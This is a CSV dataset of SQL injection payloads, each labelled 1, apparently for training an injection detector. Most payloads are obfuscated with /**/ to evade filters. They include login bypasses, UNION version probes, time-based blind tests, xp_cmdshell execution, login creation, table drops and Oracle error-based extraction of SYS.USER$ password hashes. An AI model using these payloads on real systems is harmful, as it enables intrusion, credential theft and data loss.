Query,Label
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  column_name  )   FR/**/OM   (  SEL/**/ECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIMI/**/T FR/**/OM all_tab_columns  )   W/**/HERE LIMI/**/T  =  7   )    )    A/**/ND 'i'  =  'i",1
&apos; O/**/R,1
sqlvuln;,1
se/**/lect * fr/**/om users wh/**/ere id  =  1 + $+%$ o/**/r 1  =  1 -- 1,1
sele/**/ct * fro/**/m users wh/**/ere id  =  '1' + $+%\ o/**/r 1  =  1 -- 1',1
""" o/**/r """"*""",1
"hi o/**/r 1  =  1 --""",1
" se/**/lect * fr/**/om users wh/**/ere id  =  1. u/**/nion sele/**/ct n/**/ull,banner fr/**/om v$version whe/**/re rownum  =  1 -- 1",1
; exec master..xp_cmdshell 'pi/**/ng 172.10.1.255'--,1
" selec/**/t * fro/**/m users wher/**/e id  =  '1' o/**/r 1^  =  1 un/**/ion sele/**/ct 1,banner fr/**/om v$version wher/**/e rownum  =  1 -- 1'",1
" se/**/lect * f/**/rom users wher/**/e id  =  '1' unio/**/n sele/**/ct ""?""_,version  (    )   -- 1'",1
s/**/elect * fro/**/m i/**/nfo/**/rmation_schema.ta/**/bles--,1
sele/**/ct * fro/**/m users w/**/here id  =  1 o/**/r \<\. o/**/r 1  =  1 -- 1,1
   (  s/**/elect top 1,1
Ã½ o/**/r 1  =  1 --,1
a' --,1
 o/**/r 1  =  1 /*,1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r 1#"", u/**/nion selec/**/t nu/**/ll,version  (    )   -- 1",1
" sele/**/ct * fr/**/om users wh/**/ere id  =  '1' u/**/nion sel/**/ect $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlogi/**/n 'name' , 'passwo/**/rd'",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1   u/**/nion se/**/lect n/**/ull,banner fro/**/m v$version w/**/here rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" se/**/lect * fr/**/om users whe/**/re id  =  1 o/**/r "".  )  "" o/**/r 1  =  1 -- 1",1
" selec/**/t * f/**/rom users wh/**/ere id  =  1 o/**/r @<@  =  1 uni/**/on sel/**/ect 1,version  (    )   -- 1",1
group b/**/y userid havi/**/ng 1  =  1--,1
" sel/**/ect * fr/**/om users w/**/here id  =  1 + \+%1 uni/**/on selec/**/t nul/**/l,@@VERSION -- 1",1
s/**/elect * f/**/rom users whe/**/re id  =  1 *1 o/**/r 1  =  1 -- 1,1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 o/**/r @#"";  =  1 o/**/r 1  =  1 -- 1",1
‘ o/**/r 1  =  1 --,1
" s/**/elect * fr/**/om users w/**/here id  =  1 *\. uni/**/on se/**/lect n/**/ull,@@VERSION -- 1",1
selec/**/t * fro/**/m users wher/**/e id  =  1 %  (  @  )   o/**/r 1  =  1 -- 1,1
o/**/r 'a'  =  'a,1
declare @s varchar  (  22  )   sele/**/ct @s   = ,1
" s/**/elect * fr/**/om users w/**/here id  =  1 unio/**/n selec/**/t 1<@,version  (    )   -- 1",1
" selec/**/t * f/**/rom users wh/**/ere id  =  1 + \+*\ u/**/nion sel/**/ect nu/**/ll,@@VERSION -- 1",1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r 1#"". u/**/nion sel/**/ect version  (    )  ,version  (    )   -- 1",1
@variable,1
; exec master..xp_cmdshell,1
s/**/elect * fr/**/om users wh/**/ere id  =  1 +  (  1  )   o/**/r 1  =  1 -- 1,1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 u/**/nion s/**/elect @ 1$,version  (    )   -- 1",1
" s/**/elect * fro/**/m users whe/**/re id  =  1 un/**/ion s/**/elect @ 1a,version  (    )   -- 1",1
" selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r  @$#  =  1 unio/**/n s/**/elect 1,version  (    )   -- 1",1
" s/**/elect * fro/**/m users wher/**/e id  =  '1' o/**/r   (  \.  )    =  1 uni/**/on sele/**/ct 1,@@VERSION -- 1'",1
 a/**/nd 1 i/**/n   (  s/**/elect var fro/**/m temp  )  --,1
" sel/**/ect * f/**/rom users wh/**/ere id  =  '1' u/**/nion sele/**/ct 1""!"",banner fr/**/om v$version wh/**/ere rownum  =  1 -- 1'",1
" s/**/elect * fro/**/m users wher/**/e id  =  1 o/**/r ""1]"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * f/**/rom users wher/**/e id  =  1 o/**/r ""$?"" o/**/r 1  =  1 -- 1",1
o/**/r x  =  x,1
o/**/r a  =  a,1
o/**/r '1'  =  '1,1
" sel/**/ect * fr/**/om users whe/**/re id  =  11<1# unio/**/n selec/**/t 1,version  (    )   -- 1",1
   )    )    o/**/r    (    (   'x'   )    )     =     (    (   'x,1
" s/**/elect * fro/**/m users wher/**/e id  =  '1' o/**/r \.<1 uni/**/on selec/**/t 1,@@VERSION -- 1'",1
" se/**/lect * fr/**/om users w/**/here id  =  '1' <@&1 un/**/ion selec/**/t 1,version  (    )   -- 1'",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  ta/**/ble_name  )   F/**/ROM   (  SEL/**/ECT DI/**/STI/**/NCT  (  tabl/**/e_name  )  , ROWNUM AS LIM/**/IT FR/**/OM sys.all_tabl/**/es  )   WH/**/ERE LIMI/**/T  =  4   )    )    AN/**/D 'i'  =  'i",1
; if i/**/s_srvrolemember  (  'sysadmi/**/n'  )   > 0 waitfo/**/r delay '0:0:2' --,1
selec/**/t * f/**/rom users wher/**/e id  =  1 <@<@ o/**/r 1  =  1 -- 1,1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 unio/**/n s/**/elect @<@$,version  (    )   -- 1",1
" s/**/elect * fro/**/m users wher/**/e id  =  '1' <@<@ uni/**/on sel/**/ect 1,version  (    )   -- 1'",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r ""$_"" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fro/**/m users whe/**/re id  =  1 o/**/r 1#""{ u/**/nion sele/**/ct version  (    )  ,version  (    )   -- 1",1
a' o/**/r 1  =  1--,1
 )   o/**/r   (  a  =  a,1
"""   )    )    o/**/r    (    (   ""x""   )    )     =     (    (   ""x",1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r 1#""; o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users wher/**/e id  =  '1' <@$_ u/**/nion se/**/lect 1,version  (    )   -- 1'",1
-- &passwo/**/rd  = ,1
se/**/lect * fro/**/m users wher/**/e id  =  1 <@. o/**/r 1  =  1 -- 1,1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r ""  (    )  "" o/**/r 1  =  1 -- 1",1
" s/**/elect * f/**/rom users wh/**/ere id  =  1 %$ 1 u/**/nion sele/**/ct nu/**/ll,@@VERSION -- 1",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  granted_role  )   FR/**/OM   (  SELEC/**/T DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LIM/**/IT FR/**/OM dba_role_privs WHER/**/E GRANTEE  =  SYS.LOGI/**/NUSER  )   WH/**/ERE LIM/**/IT  =  3   )    )    A/**/ND 'i'  =  'i",1
 o/**/r '1'  =  '1,1
admi/**/n' o/**/r 1  =  1,1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r "";,""  =  1 o/**/r 1  =  1 -- 1",1
" se/**/lect * fr/**/om users w/**/here id  =  1 u/**/nion se/**/lect @||1,version  (    )   -- 1",1
" sele/**/ct * f/**/rom users w/**/here id  =  1 +\+. uni/**/on selec/**/t nul/**/l,@@VERSION -- 1",1
" s/**/elect * f/**/rom users w/**/here id  =  1 o/**/r ""  )  ,"" o/**/r 1  =  1 -- 1",1
" unio/**/n s/**/elect * fro/**/m users wh/**/ere logi/**/n   =   char  (  114,111,111,116  )  ;",1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 o/**/r 1#""? u/**/nion sele/**/ct 1,version  (    )   -- 1",1
 o/**/r 1  =  1--,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  granted_role  )   FR/**/OM   (  SEL/**/ECT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LI/**/MIT FRO/**/M dba_role_privs W/**/HERE GRANTEE  =  SYS.LOGI/**/NUSER  )   W/**/HERE L/**/IMIT  =  5   )    )    AN/**/D 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ o/**/r 3  =  3 --,1
" selec/**/t * fro/**/m users wher/**/e id  =  1 -1<@ unio/**/n s/**/elect 1,version  (    )   -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id  =  1 o/**/r ""$#"" o/**/r 1  =  1 -- 1",1
 )   uni/**/on se/**/lect * f/**/rom i/**/nfo/**/rmation_schema.tabl/**/es;,1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r ""  )  ]"" o/**/r 1  =  1 -- 1",1
"  )   o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
 AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T COUNT  (  DI/**/STI/**/NCT  (  column_name   )    )    F/**/ROM sys.all_tab_columns   )    )    A/**/ND 'i'  =  'i,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  tab/**/le_name  )   FR/**/OM   (  S/**/ELECT DI/**/STI/**/NCT  (  tabl/**/e_name  )  , ROWNUM AS LI/**/MIT FRO/**/M sys.all_t/**/ables  )   WHER/**/E LIMI/**/T  =  7   )    )    AN/**/D 'i'  =  'i",1
""" o/**/r """" """,1
de/**/lete,1
;waitfo/**/r delay '0:0:__TIME__'--,1
 o/**/r 1  =  1 --,1
1' an/**/d non_exi/**/stant_tabl/**/e   =   '1,1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 o/**/r ""&  )  "" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fro/**/m users whe/**/re id  =  '1' + $ . un/**/ion sele/**/ct 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   sele/**/ct @s   =   0x77616974 ...,1
x' AN/**/D userid I/**/S N/**/ULL; --,1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r "";["" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  '1' o/**/r \.<   =  1 unio/**/n selec/**/t 1,@@VERSION -- 1'",1
" selec/**/t * fro/**/m users wher/**/e id  =  1 uni/**/on selec/**/t @<@,version  (    )   -- 1",1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 -@<@ unio/**/n sel/**/ect 1,version  (    )   -- 1",1
 AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT host_name F/**/ROM v$i/**/nstance   )    )    AN/**/D 'i'  =  'i,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  column_name  )   F/**/ROM   (  S/**/ELECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIM/**/IT FR/**/OM all_tab_columns  )   WH/**/ERE LI/**/MIT  =  2   )    )    A/**/ND 'i'  =  'i",1
s/**/elect * fro/**/m users wh/**/ere id  =  1 +   (  \+  )   o/**/r 1  =  1 -- 1,1
" se/**/lect * fro/**/m users wher/**/e id  =  1 o/**/r "".["" o/**/r 1  =  1 -- 1",1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r ""  (  ["" o/**/r 1  =  1 -- 1",1
UNIO/**/N ALL SELEC/**/T,1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r ""1#"" o/**/r 1  =  1 -- 1",1
sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r \<1 o/**/r 1  =  1 -- 1,1
" selec/**/t * f/**/rom users w/**/here id  =  1 | |1 un/**/ion s/**/elect 1,banner f/**/rom v$version w/**/here rownum  =  1 -- 1",1
x' o/**/r full_name lik/**/e '%bob%,1
x' an/**/d members.email i/**/s NU/**/LL; --,1
 o/**/r 2 > 1,1
s/**/elect * fro/**/m users w/**/here id  =  1.*1 o/**/r 1  =  1 -- 1,1
"""  )   o/**/r pg_sleep  (  __TIME__  )  --",1
 ',1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r $<\. unio/**/n sele/**/ct 1,@@VERSION -- 1",1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 o/**/r ""@  )  "" o/**/r 1  =  1 -- 1",1
s/**/elect * fro/**/m users wh/**/ere id  =  1 o/**/r \.<$ o/**/r 1  =  1 -- 1,1
 )   o/**/r sleep  (  __TIME__  )    =  ',1
sleep 50',1
" s/**/elect * f/**/rom users wher/**/e id  =  '1' + 1||1 un/**/ion sele/**/ct 1,banner fr/**/om v$version whe/**/re rownum  =  1 -- 1'",1
s/**/elect * fro/**/m users w/**/here id  =  1 + $+%\ o/**/r 1  =  1 -- 1,1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 o/**/r "";  (  "" o/**/r 1  =  1 -- 1",1
o/**/r sleep  (  __TIME__  )    =  ',1
" s/**/elect * fr/**/om users w/**/here id  =  1 o/**/r "";_"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r 1#"". u/**/nion s/**/elect 1,version  (    )   -- 1",1
" selec/**/t * f/**/rom users w/**/here id  =  1 uni/**/on sel/**/ect  @ $,version  (    )   -- 1",1
" selec/**/t * fro/**/m users whe/**/re id  =  1 uni/**/on se/**/lect +!<@,version  (    )   -- 1",1
" sel/**/ect * f/**/rom users w/**/here id  =  1 <@<@ un/**/ion sel/**/ect nul/**/l,version  (    )   -- 1",1
o/**/r 2 > 1,1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
anythi/**/ng' O/**/R 'x'  =  'x,1
" sele/**/ct * fr/**/om users w/**/here id  =  1 o/**/r \<\ un/**/ion selec/**/t 1,@@VERSION -- 1",1
" s/**/elect * f/**/rom users wh/**/ere id  =  1 uni/**/on sel/**/ect   (  1  )  ,banner fro/**/m v$version w/**/here rownum  =  1 -- 1",1
" se/**/lect * fr/**/om users w/**/here id  =  1 *  (  \  )   u/**/nion sele/**/ct nu/**/ll,@@VERSION -- 1",1
&',1
a' o/**/r 3  =  3--,1
" sele/**/ct * f/**/rom users wh/**/ere id  =  '1' o/**/r $+<$ uni/**/on selec/**/t 1,@@VERSION -- 1'",1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 +1 u/**/nion sele/**/ct 1,banner fro/**/m v$version w/**/here rownum  =  1 -- 1",1
"admi/**/n""o/**/r 1  =  1 o/**/r """"  =  """,1
uni/**/on sel/**/ect,1
""" o/**/r """"&""",1
 )    )   ;waitfo/**/r delay '0:0:__TIME__'--,1
" s/**/elect * fr/**/om users w/**/here id  =  1 o/**/r ""?;"" o/**/r 1  =  1 -- 1",1
1 waitfo/**/r delay '0:0:10'--,1
bfilename,1
admi/**/n'  )   o/**/r   (  '1'  =  '1'--,1
UEf,1
 -- &passwo/**/rd  = ,1
1 o/**/r sleep  (  __TIME__  )  #,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  tab/**/le_name  )   FR/**/OM   (  SELE/**/CT DI/**/STI/**/NCT  (  tabl/**/e_name  )  , ROWNUM AS LIM/**/IT FR/**/OM sys.all_ta/**/bles  )   WHE/**/RE LIMI/**/T  =  6   )    )    A/**/ND 'i'  =  'i",1
" sel/**/ect * fr/**/om users whe/**/re id  =  '1' u/**/nion s/**/elect $[""],@@VERSION -- 1'",1
" selec/**/t * f/**/rom users wher/**/e id  =  '1' + @  (  1  )   u/**/nion sel/**/ect 1,version  (    )   -- 1'",1
1' an/**/d 1  =    (  selec/**/t count  (  *  )   fro/**/m t/**/ablenames  )  ; --,1
o/**/r sleep  (  __TIME__  )  #,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  granted_role  )   F/**/ROM   (  S/**/ELECT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LIM/**/IT FR/**/OM dba_role_privs WHER/**/E GRANTEE  =  SYS.LOGI/**/NUSER  )   WH/**/ERE LI/**/MIT  =  8   )    )    A/**/ND 'i'  =  'i",1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r 1#"",  =  1 o/**/r 1  =  1 -- 1",1
||6,1
o/**/r 1/*,1
" a/**/nd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
sel/**/ect * fr/**/om users w/**/here id  =  1.%@ o/**/r 1  =  1 -- 1,1
" selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r ""..""  =  1 o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r 1&@#  =  1 unio/**/n se/**/lect 1,version  (    )   -- 1",1
" s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r "";]"" o/**/r 1  =  1 -- 1",1
" o/**/r 1  =  1 o/**/r """"  =  ",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  SE/**/LECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIM/**/IT FRO/**/M SYS.USER$  )   WHER/**/E LIMI/**/T  =  7   )    )    AN/**/D 'i'  =  'i",1
se/**/lect * fro/**/m users wh/**/ere id  =  1 o/**/r $<\. o/**/r 1  =  1 -- 1,1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 *  (  1  )   uni/**/on selec/**/t 1,banner fr/**/om v$version wher/**/e rownum  =  1 -- 1",1
o/**/r 'whatever' i/**/n   (  'whatever'  ) ,1
declare @s varchar   (  200  )   s/**/elect @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
s/**/elect * fr/**/om users wh/**/ere id  =  '1'   o/**/r 1  =  1 -- 1',1
?,1
 AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT COUNT  (  DI/**/STI/**/NCT  (  tabl/**/e_name   )    )    FR/**/OM sys.all_ta/**/bles   )    )    AN/**/D 'i'  =  'i,1
" s/**/elect * fr/**/om users wher/**/e id  =  '1' uni/**/on se/**/lect @ 1,version  (    )   --  1'",1
"admi/**/n""  )   o/**/r   (  ""1""  =  ""1""#",1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r 1#"", uni/**/on s/**/elect 'a',version  (    )   -- 1",1
" s/**/elect * f/**/rom users whe/**/re id  =  1 o/**/r ""$  (  "" o/**/r 1  =  1 -- 1",1
 o/**/r '' ',1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r "";#"" o/**/r 1  =  1 -- 1",1
o/**/r 1  =  1,1
 ; dro/**/p ta/**/ble temp --,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  PASSWO/**/RD  )   F/**/ROM   (  S/**/ELECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIMI/**/T FRO/**/M SYS.USER$  )   W/**/HERE LIMI/**/T  =  2   )    )    AN/**/D 'i'  =  'i",1
""" o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
""" o/**/r ""x""  =  ""x",1
s/**/elect * fro/**/m users whe/**/re id  =  '1'<@.. o/**/r 1  =  1 -- 1',1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r !<@ unio/**/n sel/**/ect 1,version  (    )   -- 1",1
 o/**/r 'somethi/**/ng' l/**/ike 'some%',1
; if no/**/t   (    (   se/**/lect serverproperty  (  'i/**/si/**/ntegratedsecurityonly'   )    )    <> 0  )   waitfo/**/r delay '0:0:2' --,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FR/**/OM   (  S/**/ELECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIMI/**/T F/**/ROM SYS.USER$  )   WHE/**/RE LIM/**/IT  =  4   )    )    A/**/ND 'i'  =  'i",1
se/**/lect * f/**/rom users whe/**/re id  =  '1' o/**/r \<\. o/**/r 1  =  1 -- 1',1
; exec master..xp_cmdshell 'pi/**/ng 10.10.1.2'--,1
admi/**/n' o/**/r '1'  =  '1'--,1
; if no/**/t   (    (   sele/**/ct serverproperty  (  'i/**/si/**/ntegratedsecurityonly'   )    )    <> 1  )   waitfo/**/r delay '0:0:2' --,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  t/**/able_name  )   FRO/**/M   (  SE/**/LECT DI/**/STI/**/NCT  (  tabl/**/e_name  )  , ROWNUM AS LIM/**/IT F/**/ROM sys.all_tab/**/les  )   WHER/**/E LIM/**/IT  =  2   )    )    AN/**/D 'i'  =  'i",1
" selec/**/t * fro/**/m users wher/**/e id  =  1 <@<@ un/**/ion sel/**/ect version  (    )  ,version  (    )   -- 1",1
" selec/**/t * fro/**/m users wher/**/e id  =  1 o/**/r 1#""$ unio/**/n sel/**/ect n/**/ull,version  (    )   -- 1",1
""";waitfo/**/r delay '0:0:__TIME__'--",1
x' a/**/nd userid i/**/s N/**/ULL; --,1
se/**/lect * fr/**/om users wh/**/ere id  =  '1' *$ 1 o/**/r 1  =  1 -- 1',1
" se/**/lect * fro/**/m users wh/**/ere id  =  1 o/**/r \<\ uni/**/on se/**/lect nu/**/ll,@@VERSION -- 1",1
" sel/**/ect * f/**/rom users wh/**/ere id  =  1 o/**/r ""?@"" o/**/r 1  =  1 -- 1",1
’ o/**/r ‘1’  =  ’1,1
" sele/**/ct * f/**/rom users wher/**/e id  =  '1' unio/**/n sele/**/ct 1a,banner f/**/rom v$version wher/**/e rownum  =  1 -- 1'",1
admi/**/n'o/**/r 1  =  1 o/**/r ''  =  ',1
" selec/**/t * f/**/rom users w/**/here id  =  '1' o/**/r !<1 un/**/ion sel/**/ect 1,version  (    )   -- 1'",1
" an/**/d 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
exec  (  @s  ) ,1
" se/**/lect * fr/**/om users wher/**/e id  =  1 o/**/r ""_  )  "" o/**/r 1  =  1 -- 1",1
" s/**/elect * f/**/rom users w/**/here id  =  1 o/**/r \.<   =  1 un/**/ion selec/**/t 1,@@VERSION -- 1",1
 o/**/r 1  =  1,1
sel/**/ect * fro/**/m users w/**/here id  =  1 + $+%1 o/**/r 1  =  1 -- 1,1
" se/**/lect * f/**/rom users wh/**/ere id  =  1.  unio/**/n se/**/lect version  (    )  ,version  (    )   -- 1",1
x' A/**/ND email I/**/S N/**/ULL; --,1
" sel/**/ect * f/**/rom users wher/**/e id  =  '1' + @ @1 u/**/nion sel/**/ect 1,version  (    )   -- 1'",1
 --,1
" s/**/elect * fro/**/m users w/**/here id  =  '1'   uni/**/on selec/**/t n/**/ull,banner fr/**/om v$version w/**/here rownum  =  1 -- 1'",1
" s/**/elect * fro/**/m users wh/**/ere id  =  11||1 uni/**/on s/**/elect 1,banner fr/**/om v$version wher/**/e rownum  =  1 -- 1",1
" sel/**/ect * fr/**/om users w/**/here id  =  1.*1 un/**/ion sel/**/ect 1,banner f/**/rom v$version w/**/here rownum  =  1 -- 1",1
upda/**/te,1
 o/**/r 1/*,1
" selec/**/t * fro/**/m users w/**/here id  =  1.<1# uni/**/on sel/**/ect 1,version  (    )   -- 1",1
"""   )    )    o/**/r pg_sleep  (  __TIME__  )  --",1
||'6,1
" s/**/elect * fro/**/m users wh/**/ere id  =  1. <@ un/**/ion se/**/lect 1,version  (    )   -- 1",1
o/**/r   (  EXI/**/STS  ) ,1
^',1
o/**/r 'text'   =   n'text',1
" sel/**/ect * fr/**/om users w/**/here id  =  1 + \+*$ uni/**/on se/**/lect nul/**/l,@@VERSION -- 1",1
" sel/**/ect * fro/**/m users w/**/here id  =  '1' un/**/ion sele/**/ct $ _,@@VERSION -- 1'",1
" s/**/elect * fro/**/m users wher/**/e id  =  1 o/**/r ""  )  ;"" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users wh/**/ere id  =  1 <@1$ un/**/ion selec/**/t 1,version  (    )   -- 1",1
 o/**/r 0  =  0 --,1
" s/**/elect * fro/**/m users w/**/here id  =  1 o/**/r ""{1""  =  1 o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users whe/**/re id  =  1 o/**/r ""{,""  =  1 o/**/r 1  =  1 -- 1",1
" sele/**/ct * fro/**/m users whe/**/re id  =  1 o/**/r 1#"", uni/**/on s/**/elect version  (    )  ,version  (    )   -- 1",1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 o/**/r 1#""? uni/**/on sele/**/ct 'a',version  (    )   -- 1",1
passwo/**/rd:*/  =  1--,1
" selec/**/t * fr/**/om users wher/**/e id  =  1 <@. unio/**/n selec/**/t 1,version  (    )   -- 1",1
" s/**/elect * f/**/rom users whe/**/re id  =  1 o/**/r ""  )  @"" o/**/r 1  =  1 -- 1",1
" s/**/elect * fr/**/om users whe/**/re id  =  '1' unio/**/n sel/**/ect @ @1,version  (    )   --  1'",1
" unio/**/n   (  sele/**/ct NUL/**/L,   (  se/**/lect @@version   )    )    --",1
" sele/**/ct * f/**/rom users whe/**/re id  =  1 o/**/r ""  )  {"" o/**/r 1  =  1 -- 1",1
" s/**/elect * f/**/rom users wh/**/ere id  =  1.<@. un/**/ion sel/**/ect 1,version  (    )   -- 1",1
" sele/**/ct * f/**/rom users wh/**/ere id  =  1 +\. un/**/ion sele/**/ct nul/**/l,@@VERSION -- 1",1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 + @<@. uni/**/on sel/**/ect 1,version  (    )   -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r \<$ uni/**/on se/**/lect 1,@@VERSION -- 1",1
" s/**/elect * fr/**/om users w/**/here id  =  1 o/**/r   (  $+  )    =  1 u/**/nion sele/**/ct 1,@@VERSION -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id  =  1 +   (  \+  )   uni/**/on selec/**/t nu/**/ll,@@VERSION -- 1",1
" selec/**/t * f/**/rom users whe/**/re id  =  1. uni/**/on sel/**/ect nu/**/ll,version  (    )   -- 1",1
" selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r ""  )  ["" o/**/r 1  =  1 -- 1",1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 o/**/r \.<1 un/**/ion selec/**/t 1,@@VERSION -- 1",1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT banner FR/**/OM v$version W/**/HERE ROWNUM  =  1   )    )    AN/**/D 'i'  =  'i,1
se/**/lect * f/**/rom users w/**/here id  =  1 <@$_ o/**/r 1  =  1 -- 1,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  column_name  )   FRO/**/M   (  SELEC/**/T DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIMI/**/T FRO/**/M all_tab_columns  )   WHE/**/RE LIM/**/IT  =  3   )    )    AN/**/D 'i'  =  'i",1
" se/**/lect * fr/**/om users wher/**/e id  =  1 o/**/r $+<$ un/**/ion sel/**/ect 1,@@VERSION -- 1",1
